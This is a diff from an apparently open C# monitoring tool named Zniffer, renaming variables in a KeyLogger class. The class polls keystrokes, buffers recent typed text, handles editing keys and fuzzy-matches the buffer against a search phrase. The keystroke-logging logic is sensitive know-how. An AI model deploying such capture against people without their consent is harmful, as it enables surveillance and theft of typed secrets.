@@ -13,9 +13,8 @@ namespace Zniffer.FilesAndText {
         //event raised when key is pressed
         public delegate void keyCaptured(string s);
 
-        public static System.Timers.Timer resetStringTimer = new System.Timers.Timer(5000);//5sec reset time
+        public static System.Timers.Timer timerResetString = new System.Timers.Timer(5000);//5sec reset time
 
-        private string keyBuffer;
         private System.Timers.Timer timerKeyMine;
         private string handleCurrentWindow;
         private string handlePrevWindow;
@@ -27,7 +26,7 @@ namespace Zniffer.FilesAndText {
         #endregion
 
         #region Keylogger
-        public static string loggedKeyString = "";
+        public static string keyBuffer = "";
         public static long cursorPosition = 0;
         #endregion
 
@@ -39,19 +38,18 @@ namespace Zniffer.FilesAndText {
 
         public KeyLogger(MainWindow window) {
             this.window = window;
-            keyBuffer = string.Empty;
 
             timerKeyMine = new System.Timers.Timer();
             timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(getPressedKeys);
             timerKeyMine.Interval = 10;
             timerKeyMine.Enabled = true;
 
-            resetStringTimer.Elapsed += new System.Timers.ElapsedEventHandler(OnResetTimerEvent);
+            timerResetString.Elapsed += new System.Timers.ElapsedEventHandler(OnResetTimerEvent);
         }
 
         public void OnResetTimerEvent(object source, System.Timers.ElapsedEventArgs e) {
             cursorPosition = 0;
-            loggedKeyString = "";
+            keyBuffer = "";
 
         }
 
@@ -59,52 +57,52 @@ namespace Zniffer.FilesAndText {
             if (s.Substring(0, 1).Equals("<") && s.Substring(s.Length - 1, 1).Equals(">")) {//special characters
                 s = s.Substring(1, s.Length - 2);
                 if (s.Equals("Backspace")) {
-                    resetStringTimer.Stop();
-                    if (loggedKeyString.Length > 0) {
-                        loggedKeyString = loggedKeyString.Remove(loggedKeyString.Length - 1);
+                    timerResetString.Stop();
+                    if (keyBuffer.Length > 0) {
+                        keyBuffer = keyBuffer.Remove(keyBuffer.Length - 1);
                         cursorPosition--;
                     }
                 }
                 else if (s.Equals("Left")) {
-                    resetStringTimer.Stop();
+                    timerResetString.Stop();
 
                     if (cursorPosition > 0)
                         cursorPosition--;
                 }
                 else if (s.Equals("Right")) {
-                    resetStringTimer.Stop();
+                    timerResetString.Stop();
 
-                    if (cursorPosition < loggedKeyString.Length)
+                    if (cursorPosition < keyBuffer.Length)
                         cursorPosition++;
                 }
             }
             else if (s.Substring(0, 1).Equals("[") && s.Substring(s.Length - 1, 1).Equals("]")) {//active window changed
-                resetStringTimer.Stop();
+                timerResetString.Stop();
 
             }
             else {//normal characters
-                resetStringTimer.Stop();
+                timerResetString.Stop();
 
-                loggedKeyString += s;
+                keyBuffer += s;
                 cursorPosition++;
 
                 if (s.Equals("\n")) {//user returned(ended) string
                     cursorPosition = 0;
-                    loggedKeyString = "";
+                    keyBuffer = "";
                 }
             }
 
-            if (loggedKeyString.Length > 50)
-                loggedKeyString = loggedKeyString.Remove(0, 1);
-            Console.Out.WriteLine(loggedKeyString);
+            if (keyBuffer.Length > 50)
+                keyBuffer = keyBuffer.Remove(0, 1);
+            Console.Out.WriteLine(keyBuffer);
             string phrase = MainWindow.SearchPhrase;
-            LevenshteinMatches result = loggedKeyString.Levenshtein(phrase, mode: MainWindow.SearchMode);
+            LevenshteinMatches result = keyBuffer.Levenshtein(phrase, mode: MainWindow.SearchMode);
 
             if (result !=null && result.hasMatches) {
                 window.AddTextToClipBoardBox(result);
             }
 
-            resetStringTimer.Start();
+            timerResetString.Start();
         }
 
 
